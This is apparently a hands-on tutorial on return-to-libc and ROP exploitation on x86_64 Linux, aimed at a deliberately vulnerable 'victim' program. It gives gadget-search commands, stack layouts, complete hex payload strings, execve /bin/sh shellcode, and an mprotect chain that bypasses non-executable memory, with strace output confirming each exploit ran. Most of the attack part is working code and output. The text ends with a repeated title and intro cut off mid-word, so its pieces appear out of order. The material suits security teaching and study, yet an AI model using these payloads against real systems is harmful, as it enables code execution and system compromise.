+ 
+so, we need to achieve the following:
+ 
+%rdi    <- "/bin/sh" (note, null terminated)
+%rsi    <- null/0x00
+%rdx    <- null/0x00
+ 
+%rax will be set to 0x3b (59) when execution is directed to <execve> libc function.
+ 
+Disassembled victim code:
+ 
+--
+ 
+00000000004005b4 <main>:
+  4005b4:       55                      push   %rbp
+  4005b5:       48 89 e5                mov    %rsp,%rbp
+  4005b8:       48 83 ec 40             sub    $0x40,%rsp
+  4005bc:       b8 fc 06 40 00          mov    $0x4006fc,%eax
+  4005c1:       48 8d 55 c0             lea    -0x40(%rbp),%rdx
+  4005c5:       48 89 d6                mov    %rdx,%rsi
+  4005c8:       48 89 c7                mov    %rax,%rdi
+  4005cb:       b8 00 00 00 00          mov    $0x0,%eax
+  4005d0:       e8 bb fe ff ff          callq  400490 <printf@plt>
+  4005d5:       bf 10 07 40 00          mov    $0x400710,%edi
+  4005da:       e8 c1 fe ff ff          callq  4004a0 <puts@plt>
+  4005df:       48 8d 45 c0             lea    -0x40(%rbp),%rax
+  4005e3:       48 89 c7                mov    %rax,%rdi
+  4005e6:       e8 d5 fe ff ff          callq  4004c0 <gets@plt>
+  4005eb:       b8 25 07 40 00          mov    $0x400725,%eax
+  4005f0:       48 8d 55 c0             lea    -0x40(%rbp),%rdx
+  4005f4:       48 89 d6                mov    %rdx,%rsi
+  4005f7:       48 89 c7                mov    %rax,%rdi
+  4005fa:       b8 00 00 00 00          mov    $0x0,%eax
+  4005ff:       e8 8c fe ff ff          callq  400490 <printf@plt>
+  400604:       b8 00 00 00 00          mov    $0x0,%eax
+  400609:       c9                      leaveq
+  40060a:       c3                      retq  
+  40060b:       90                      nop
+  40060c:       90                      nop
+ 
+--
+ 
+There is a "leaveq" and a "retq".
+leaveq does this:
+ 
+mov %rbp, %rsp
+pop %rbp
+ 
+retq returns to the "calling function", pops the next address off the stack and directs execution there.
+ 
+Stack lay-out:
+ 
+        -----------------
+        | buffer (name) |
+        |               |
+        |   64 bytes    |
+        |               |
+        |---------------|
+        |  saved %rbp   |
+        |---------------|
+        |  saved ret    |
+        |---------------|
+        |  older stack  |
+        |     . . .     |
+ 
+ 
+RET2LIBC refers to jumping to instructions within libc (loaded with victim, because of the inclusion of the <stdio.h> header), either code fragments, or function calls (which often, but not always, are interfaces to sys calls). So, since we cannot execute any code directly, we jump to code that _is_ executable.
+ 
+Since we fully control %rip (and probably quite a bit of stack after that), we can send execution anywhere we want. Since we need to pass 3 parameters, we need something for %rdi, %rsi and %rdx. And since this will need to be chained (eventually everything needs to end up in <execve>, we will need to return, as well.
+ 
+RET2LIBC is also referred to as POP POP RET. And here's why: what we'll do is find code that does:
+ 
+pop %rdi
+retq
+pop %rsi
+retq
+pop %rdx
+retq
+<execve>
+ 
+ 
+These individual 'pop-rets' are usually referred to as "gadgets". They will allow us to jump around the code. So, we need to find memory addresses to give us this.
+ 
+This is where the article linked above was very useful. We can grep through libc for retq, but that's a lot of stuff to go through. If we know what the actual hex opcodes are, we can look for them directly. To make this easy, I wrote a real quick bit of assembly that pushed some stuff to the stack, then pops rdi, rsi, rex, dcx, r9 and r8.
+ 
+  600084:       5f                      pop    %rdi
+  600085:       5e                      pop    %rsi
+  600086:       5a                      pop    %rdx
+  600087:       59                      pop    %rcx
+  600088:       41 59                   pop    %r9
+  60008a:       41 58                   pop    %r8
+ 
+Nicely, all the main register "pops" are just a single byte.
+ 
+We can now look for "pop %rdi - retq" by bytes:
+# locate libc.so
+/lib/libc.so.6
+/lib32/libc.so.6
+/opt/AutoScan/usr/lib/libc.so
+/opt/AutoScan/usr/lib/libc.so.6
+/usr/lib/libc.so
+# xxd -c1 -p /lib/libc.so.6 | grep -n -B1 c3 | grep 5f | awk '{printf"%x\n",$1-1}'
+2028b
+22a3e
+233fa
+23a77
+248cf
+254b9
+25d54
+261f1
+2675e
+27047
+277e4
+27b71
+280f8
+28761
+290cd
+...
+ 
+Note: when doing this on your own machine, results will be different. If following along, follow the logic, don't just copy/paste commands.
+ 
+This basically gives us a sequence of offset addresses since the beginning of libc with byte sequences matching 5f c3 (retq).
+ 
+We can get the address in memory of libc by running victim and grepping proc/$pid/maps in a different shell window:
+ 
+(Note, in another shell run: setarch `arch` -R ./victim   -- setarch `arch` -R disables ASLR)
+ 
+# ps -ef | grep victim
+root     28258 28233  0 13:21 pts/3    00:00:00 ./victim
+root     28262 26527  0 13:21 pts/1    00:00:00 grep --color=auto victim
+# grep libc /proc/28258/maps
+7ffff7a57000-7ffff7bd4000 r-xp 00000000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7bd4000-7ffff7dd3000 ---p 0017d000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7dd3000-7ffff7dd7000 r--p 0017c000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7dd7000-7ffff7dd8000 rw-p 00180000 08:05 46534885                   /lib/libc-2.11.1.so
+ 
+So, libc (executable) lives at 0x00007ffff7a57000
+ 
+pick one of the offsets above, and simply add it to the libc address, and we have our first gadget!
+ 
+We do exactly the same for pop %rsi and pop %rdx. Finally, we need to find the offset for the <execve> function:
+ 
+# nm -D /lib/libc.so.6 | grep '\<execve\>'
+00000000000acf80 W execve
+ 
+ 
+We do the same as before, we just add this to the libc base address:
+ 
+# printf %016x $((0x7ffff7a57000+0xacf80)) | tac -rs..
+803fb0f7ff7f0000
+ 
+(note, we need this in reverse order)
+ 
+The same printf command is also used to calculate the addresses for our pop-ret gadgets.
+ 
+We place /bin/sh at the beginning of our buffer, and place the addresses and their values appropriately, which results in the following input string:
+ 
+2f62696e2f7368000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d0e5ffffff7f0000cfb8a7f7ff7f0000d0e5ffffff7f0000187baaf7ff7f00000000000000000000928ba5f7ff7f00000000000000000000803fb0f7ff7f0000
+ 
+I then turn this to binary with xxd -r -p and feed it into victim:
+ 
+This results in the following stack:
+ 
+        -----------------------
+        |    /bin/sh + 00s    |
+        |                     |
+        |      64 bytes       |
+        |                     |
+        |---------------------|
+        | 0x00007fffffffe5d0  |  <-- buffer address, will be %rbp
+        |---------------------|
+        | 0x00007ffff7a7b8cf  |  <-- libc: pop %rdi-ret
+        |---------------------|
+        | 0x00007fffffffe5d0  |  <-- buffer address: val of %rdi
+        |---------------------|
+        | 0x00007ffff7aa7b18  |  <-- libc: pop %rsi-ret
+        |---------------------|
+        | 0x0000000000000000  |  <-- null: val of %rsi
+        |---------------------|
+        | 0x00007ffff7a58b92  |  <-- libc: pop %rdx-ret
+        |---------------------|
+        | 0x0000000000000000  |  <-- null: val of %rdx
+        |---------------------|
+        | 0x00007ffff7b03f80  |  <-- libc: <execve>
+        |      . . .          |
+ 
+ 
+So, does this work? It does, but with some caveats. The thing that really messed with my head was that it would work in gdb, but then wouldn't work outside of it. Once I realized that gdb added 0x20 to the stack itself, between running interactive and through gdb I had to adjust offsets. The second thing is that while it runs, you don't actually get the shell you expect, you just get back to the command prompt. Not that that's a terrible thing here, all we're trying to do here is prove that we can do this, and the code is somewhat irrelevant. Running strace, we can see that we indeed executed /bin/bash, though:
+ 
+[    7ffff7b3c51a] mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff7000
+[    7ffff7b31f90] read(0, "/bin/sh\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 4096) = 128
+[    7ffff7b31f90] read(0, "", 4096)    = 0
+[    7ffff7b31ff0] write(1, "content of buffer: /bin/sh\n", 27content of buffer: /bin/sh
+) = 27
+[    7ffff7b03f87] execve("/bin/sh", [0], [0]) = 0
+[    7ffff7df3fca] brk(0)               = 0x6ea000
+ 
+…
+ 
+[    7ffff76ea325] stat("/usr/local/sbin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/usr/local/bin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/usr/sbin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/usr/bin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/sbin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/bin/bash", {st_dev=makedev(8, 5), st_ino=262149, st_mode=S_IFREG|0755, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=1832, st_size=934336, st_atime=2013/03/03-13:17:02, st_mtime=2010/04/18-19:16:01, st_ctime=2012/05/28-17:30:45}) = 0
+[    7ffff76ea325] stat("/bin/bash", {st_dev=makedev(8, 5), st_ino=262149, st_mode=S_IFREG|0755, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=1832, st_size=934336, st_atime=2013/03/03-13:17:02, st_mtime=2010/04/18-19:16:01, st_ctime=2012/05/28-17:30:45}) = 0
+[    7ffff76bdad7] geteuid()            = 0
+[    7ffff76bdaf7] getegid()            = 0
+[    7ffff76bdac7] getuid()             = 0
+[    7ffff76bdae7] getgid()             = 0
+[    7ffff76eb047] access("/bin/bash", X_OK) = 0
+[    7ffff76ea325] stat("/bin/bash", {st_dev=makedev(8, 5), st_ino=262149, st_mode=S_IFREG|0755, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=1832, st_size=934336, st_atime=2013/03/03-13:17:02, st_mtime=2010/04/18-19:16:01, st_ctime=2012/05/28-17:30:45}) = 0
+ 
+…
+ 
+Very good! It does actually work. (you can see the write back to stdout with the buffer contents, followed by the execve syscall)
+ 
+ 
+IMPORTANT: In x86_64, we're passing 8 byte addresses and cannot shorten it. ALL MEMORY ADDRESSES HAVE AT LEAST TWO NULL BYTES. Therefore, let's forget about null-free input…
+ 
+--------------------------------------------
+ 
+********************************
+ 
+2. RET2LIBC MPROTECT + SHELLCODE
+ 
+********************************
+ 
+Now, this is nice, but what I _really_ like is run my own shell code of choice. We can endlessly chain pop-ret if we want to, but at 8 bytes for each instruction/gadget, that quickly gets quite large. If we can use ret2libc just for a first stage and then get some code executed, we can do a lot more.
+ 
+So far we've "defeated" NX by simply never attempting to run any inserted code. We'll _actually_ have to defeat it if we want to run arbitrary code.
+ 
+To test shell code, I typically use this bit of C:
+ 
+--
+ 
+int main(int argc, char **argv) {
+ 
+    void *ptr = mmap(0, sizeof(shellcode),
+            PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
+            | MAP_PRIVATE, -1, 0);
+ 
+    if (ptr == MAP_FAILED) {
+        perror("mmap");
+        exit(-1);
+    }
+ 
+    memcpy(ptr, shellcode, sizeof(shellcode));
+    sc = ptr;
+ 
+    sc();
+ 
+    return 0;
+}
+ 
+--
+ 
+So, we should be able to do a similar thing as above and chain gadgets to mmap an area, memcpy the shell code into it, and direct execution there.
+ 
+One problem… (And this took a while to figure out) mmap takes 6 parameters:
+ 
+        void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
+ 
+This wouldn't be a problem if it were easy to find pop %r8 and pop %r9 near a ret, or something equivalent, but multiple searches through libc with either grep or xxd showed this was a dead end. 41-59-c3 and 41-58-c3 simply don't exist in (my) libc, and grepping objdump doesn't give us anything useful. So, we need a different plan.
+ 
+Rather than mmapping a location directly to PROT_EXEC | PROT_WRITE | PROT_READ and then copying, we can copy first to a data section, and then run mprotect to change the permissions.
+ 
+ 
+        void *memcpy(void *dest, void *src, size_t count);
+        int mprotect(const void *addr, size_t len, int prot);
+ 
+We need to find an area to copy to. With readelf we can find relevant sections:
+ 
+  [19] .ctors            PROGBITS        0000000000600e18 000e18 000010 00  WA  0   0  8
+  [20] .dtors            PROGBITS        0000000000600e28 000e28 000010 00  WA  0   0  8
+  [21] .jcr              PROGBITS        0000000000600e38 000e38 000008 00  WA  0   0  8
+  [22] .dynamic          DYNAMIC         0000000000600e40 000e40 0001a0 10  WA  7   0  8
+  [23] .got              PROGBITS        0000000000600fe0 000fe0 000008 08  WA  0   0  8
+  [24] .got.plt          PROGBITS        0000000000600fe8 000fe8 000038 08  WA  0   0  8
+  [25] .data             PROGBITS        0000000000601020 001020 000010 00  WA  0   0  8
+  [26] .bss              NOBITS          0000000000601030 001030 000010 00  WA  0   0  8
+  [27] .comment          PROGBITS        0000000000000000 001030 000025 01  MS  0   0  1
+ 
+ 
+I decided to pick 0x601040. So, this is where we will write the shellcode. This is a rw- memory area (W=write; A=access), so writing shouldn't be a problem. Then, with mprotect we will set it to executable. For mprotect, I found out the hard way that this works on a whole page, and once I realized what that actually meant 0x601000 will be the address we pass to mprotect. That will then also apply to the .data and .bss sections.
+ 
+----------------------------------
+PROT_EXEC | PROT_WRITE | PROT_READ
+ 
+This works just like rwx on the file system, so 7 = rwx, 5 = r-x, 6 = rw-, etc.
+ 
+I tried both 7 and 5, and both worked on my system. Some implementations apparently check whether W is set as well as X and don't allow that, so 5 is the cleaner option, unless your shell code needs to write further data, of course (but you could use the stack for that as well).
+----------------------------------
+ 
+Both memcpy and mprotect are three parameter functions, so we can reuse our previously found gadgets. (Though pop %rdx just happens to be another one)
+ 
+OK, some shellcode. This essentially does the same thing as we did before: run an execve to /bin/sh. Again, I'll just use null, null for the argv and envy params.
+ 
+--
+ 
+[bits 64]
+global _start
+ 
+section .data
+command db "/bin/sh", 0x00
+; 8 chars
+ 
+_start:
+        xor eax, eax
+        xor esi, esi
+        xor edi, edi
+        xor edx, edx
+ 
+popshell:
+        mov al,0x3b
+        lea rdi, [rel command]
+        syscall
+        call _start
+exit:
+        xor eax, eax
+        mov al, 60
+        xor edi, edi
+        syscall
+ 
+        nop
+        nop
+        nop
+        nop
+        nop
+ 
+--
+ 
+/bin/sh is loaded from a [rel command] so the address is relative (and negative, so no nulls, even though that doesn't matter here). The exit syscall here is redundant because it is never reached. The call was with the idea that if an error occurred it would be able to recover by looping back up, but that isn't actually how execve works, so could also be cut.
+ 
+0000000000600078 <command>:
+  600078:       2f                      (bad)  
+  600079:       62                      (bad)  
+  60007a:       69 6e 2f 73 68 00 31    imul   $0x31006873,0x2f(%rsi),%ebp
+ 
+0000000000600080 <_start>:
+  600080:       31 c0                   xor    %eax,%eax
+  600082:       31 f6                   xor    %esi,%esi
+  600084:       31 ff                   xor    %edi,%edi
+  600086:       31 d2                   xor    %edx,%edx
+ 
+0000000000600088 <popshell>:
+  600088:       b0 3b                   mov    $0x3b,%al
+  60008a:       48 8d 3d e7 ff ff ff    lea    -0x19(%rip),%rdi        # 600078 <command>
+  600091:       0f 05                   syscall
+  600093:       e8 e8 ff ff ff          callq  600080 <_start>
+ 
+0000000000600098 <exit>:
+  600098:       31 c0                   xor    %eax,%eax
+  60009a:       b0 3c                   mov    $0x3c,%al
+  60009c:       31 ff                   xor    %edi,%edi
+  60009e:       0f 05                   syscall
+  6000a0:       90                      nop
+  6000a1:       90                      nop
+  6000a2:       90                      nop
+  6000a3:       90                      nop
+  6000a4:       90                      nop
+ 
+Without the nops, that is 40 characters. We should have 64 chars at least for size, and +16 if we don't care about the stack base pointer. The effective code here is 26 bytes (without the call and exit), so 64 would allow us quite a few more actions, especially if we do standard de-nulling.
+ 
+The bytes under <command> stand for /bin/sh, 0x00. Because of the null byte, the rest of the shell code will not be echoed to the screen when victim prints the buffer. You can also see that command is 0x19 back from %rip when its address is loaded.
+ 
+For our pop-ret chain, we do have to remember to jump to <_start> at <command>+0x08 to jump into executable code, rather than the top of our base address. (If you don't, you start executing the /bin/sh bytes 2f, 62, etc. which give you an bad instruction error)
+ 
+xxd -s0x78 -l40 -p the compiled code to generate the shell code. This will go at the start of our input string.
+ 
+2f62696e2f73680031c031f631ff31d2b03b488d3de7ffffff0f05e8e8ffffff31c0b03c31ff0f05
+ 
+This is what the stack will look right after the get function in victim:
+ 
+        -----------------------
+        | 2f62696e2f73680031..|  <-- /bin/sh, 0x00 + executable shellcode
+        |                     |
+        |       64 bytes      |
+        |(filled up with 0x00)|
+        |---------------------|
+        | 0x00007fffffffe5d0  |  <-- %rbp (upon leave)
+        |---------------------|
+        | 0x00007ffff7a7b8cf  |  <-- libc: pop %rdi-ret
+        |---------------------|
+        | 0x0000000000601040  |  <-- start of mem to write to (dest): val of %rdi
+        |---------------------|
+        | 0x00007ffff7aa7b18  |  <-- libc: pop %rsi-ret
+        |---------------------|
+        | 0x00007fffffffe5d0  |  <-- buffer to copy from (src): val of $rsi
+        |---------------------|
+        | 0x00007ffff7aa32d2  |  <-- libc: pop %rdx-ret
+        |---------------------|
+        | 0x0000000000000028  |  <-- length to copy: 40 (0x28): val of %rdx
+        |---------------------|
+        | 0x00007ffff7adf290  |  <-- libc: <memcpy>
+        |---------------------|
+        | 0x00007ffff7a7b8cf  |  <-- libc: pop %rdi-ret
+        |---------------------|
+        | 0x0000000000601000  |  <-- top of page to mprotect: val of %rdi
+        |---------------------|
+        | 0x00007ffff7aa7b18  |  <-- libc: pop %rsi-ret
+        |---------------------|  
+        | 0x0000000000001000  |  <-- page size: val of %rsi
+        |---------------------|
+        | 0x00007ffff7aa32d2  |  <-- libc: pop %rdx-ret
+        |---------------------|
+        | 0x0000000000000005  |  <-- r-x: val of %rdx
+        |---------------------|
+        | 0x00007ffff7b3c570  |  <-- libc: <mprotect>
+        |---------------------|
+        | 0x0000000000601048  |  <-- direct to executable shell code (+0x08)
+        |---------------------|
+        | 0xacabacabacabacab  |  <-- marker/signature
+        |---------------------|
+        |                     |
+        |        . . .        |
+ 
+ 
+Full hex input string:
+2f62696e2f73680031c031f631ff31d2b03b488d3de7ffffff0f05e8e8ffffff31c0b03c31ff0f05000000000000000000000000000000000000000000000000d0e5ffffff7f0000cfb8a7f7ff7f00004010600000000000187baaf7ff7f0000d0e5ffffff7f0000d232aaf7ff7f0000280000000000000090f2adf7ff7f0000cfb8a7f7ff7f00000010600000000000187baaf7ff7f00000010000000000000d232aaf7ff7f0000050000000000000070c5b3f7ff7f00004810600000000000abacabacabacabac
+ 
+I save this in a file called mprot.ascii, and then convert to binary:
+ 
+# xxd -r -p mprot.ascii mprot
+ 
+I then run the exploit by cat'ing the file into the victim program.
+ 
+--
+ 
+# cat mprot | setarch `arch` -R ./victim
+buffer address: 0x7fffffffe5d0
+Enter text for name:
+content of buffer: /bin/sh
+#
+ 
+--
+ 
+Again, we don't actually get a shell, but we can check with strace again whether /bin/bash is actually started. And it is. Also note the call to mprotect(0x601000, 4096, PROT_READ|PROT_EXEC) = 0 right before /bin/sh is executed:
+ 
+ 
+[    7ffff7b3c51a] mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff7000
+[    7ffff7b31f90] read(0, "/bin/sh\0001\3001\3661\3771\322\260;H\215=\347\377\377\377\17\5\350\350\377\377\377"..., 4096) = 200
+[    7ffff7b31f90] read(0, "", 4096)    = 0
+[    7ffff7b31ff0] write(1, "content of buffer: /bin/sh\n", 27content of buffer: /bin/sh
+) = 27
+[    7ffff7b3c577] mprotect(0x601000, 4096, PROT_READ|PROT_EXEC) = 0
+[          60105b] execve("/bin/sh", [0], [0]) = 0
+[    7ffff7df3fca] brk(0)               = 0x6ea000
+ 
+…
+ 
+[    7ffff76ea325] stat("/usr/local/sbin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/usr/local/bin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/usr/sbin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/usr/bin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/sbin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/bin/bash", {st_dev=makedev(8, 5), st_ino=262149, st_mode=S_IFREG|0755, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=1832, st_size=934336, st_atime=2013/03/03-13:17:02, st_mtime=2010/04/18-19:16:01, st_ctime=2012/05/28-17:30:45}) = 0
+[    7ffff76ea325] stat("/bin/bash", {st_dev=makedev(8, 5), st_ino=262149, st_mode=S_IFREG|0755, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=1832, st_size=934336, st_atime=2013/03/03-13:17:02, st_mtime=2010/04/18-19:16:01, st_ctime=2012/05/28-17:30:45}) = 0
+[    7ffff76bdad7] geteuid()            = 0
+[    7ffff76bdaf7] getegid()            = 0
+[    7ffff76bdac7] getuid()             = 0
+[    7ffff76bdae7] getgid()             = 0
+[    7ffff76eb047] access("/bin/bash", X_OK) = 0
+[    7ffff76ea325] stat("/bin/bash", {st_dev=makedev(8, 5), st_ino=262149, st_mode=S_IFREG|0755, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=1832, st_size=934336, st_atime=2013/03/03-13:17:02, st_mtime=2010/04/18-19:16:01, st_ctime=2012/05/28-17:30:45}) = 0
+…
+ 
+ 
+/bin/bash executed.
+ 
+So, we know that the shell code was executed, but we can also check what happened to our data page. Before we checked /proc/$pid/maps to check the in-memory location of libc, we can do the same to get everything:
+ 
+Before (at program start):
+ 
+# cat /proc/24034/maps
+00400000-00401000 r-xp 00000000 08:05 9699676                            /xx/xx/xx/victim
+00600000-00601000 r--p 00000000 08:05 9699676                            /xx/xx/xx/victim
+00601000-00602000 rw-p 00001000 08:05 9699676                            /xx/xx/xx/victim
+7ffff7a57000-7ffff7bd4000 r-xp 00000000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7bd4000-7ffff7dd3000 ---p 0017d000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7dd3000-7ffff7dd7000 r--p 0017c000 08:05 46534885                   /lib/libc-2.11.1.so
+…
+ 
+After (at 0x601048):
+ 
+# cat /proc/24034/maps
+00400000-00401000 r-xp 00000000 08:05 9699676                            /xx/xx/xx/victim
+00600000-00601000 r--p 00000000 08:05 9699676                            /xx/xx/xx/victim
+00601000-00602000 r-xp 00001000 08:05 9699676                            /xx/xx/xx/victim
+7ffff7a57000-7ffff7bd4000 r-xp 00000000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7bd4000-7ffff7dd3000 ---p 0017d000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7dd3000-7ffff7dd7000 r--p 0017c000 08:05 46534885                   /lib/libc-2.11.1.so
+…
+ 
+00400000-00401000 is the code section
+00600000-00601000 program stuff: .ctors, .dtors, .got, .got.plt, etc.
+00601000-00602000 data section
+ 
+i.e.:
+Before: 00601000-00602000 rw-p 00001000 08:05 9699676                            /xx/xx/xx/victim
+After:  00601000-00602000 r-xp 00001000 08:05 9699676                            /xx/xx/xx/victim
+ 
+=====================================================
+ 
+
+    This proves the ret2libc/poppopret concept. In order to make all of this really useful, we'll also have to deal with stack protection and ASLR. Perhaps another time … ;)
+RET2LIBC x86_64 EXECVE and MPROTECT + SHELLC0DE EXEC ON LINUX
+ 
+Demonstrate the use of re2libc on a modern/up-to-date x86_64 Linux system for command execution and running shell code
+ 
+===============================================================
+ 
+With the move to x86_64 and a lot of current protection mechani
